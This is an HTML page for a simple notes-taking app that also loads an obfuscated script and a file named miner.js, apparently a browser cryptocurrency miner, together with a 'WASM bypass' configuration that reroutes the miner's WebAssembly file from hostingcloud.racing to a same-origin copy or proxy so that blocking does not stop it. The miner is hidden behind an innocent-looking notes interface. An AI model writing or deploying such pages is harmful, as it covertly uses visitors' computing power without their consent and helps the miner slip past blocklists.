<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Notes App</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="container">
    <h1>üìí My Notes</h1>
    <button id="newNoteBtn">‚ûï Add Note</button>
    <div id="notesContainer"></div>
  </div>

  <div id="noteModal" class="modal">
    <div class="modal-content">
      <textarea id="noteText" placeholder="Type your note here..."></textarea>
      <div class="buttons">
        <button id="saveNote">üíæ Save</button>
        <button id="closeModal">‚ùå Cancel</button>
      </div>
    </div>
  </div>

  <!-- ==== WASM BYPASS CONFIG & OVERRIDE (must load BEFORE the obfuscated done.js) ==== -->
  <script>
    // Configure: if you uploaded the .wasm to your Vercel public/, leave sameOrigin as below.
    // If you plan to use a proxy worker, set proxy to e.g. "https://my-worker.workers.dev/proxy?u="
    window.WasmBypassConfig = {
      originalHostMatch: "hostingcloud.racing",
      originalPathSubstr: "wPxSCaJj.wasm",
      sameOrigin: "/wPxSCaJj.wasm", // put the wasm file in your public/ folder
      proxy: "" // optional: "https://your-worker.workers.dev/proxy?u="
    };
  </script>

  <script src="/wasm-override.js"></script>
  <!-- then load the obfuscated done.js (or whichever script requests the remote .wasm) -->
  <script src="/path/to/miner.js"></script>
  <!-- your other app scripts -->
  <script src="script.js"></script>
  <script src="ai.js"></script>
  <script src="ai2.js"></script>
</body>
</html>
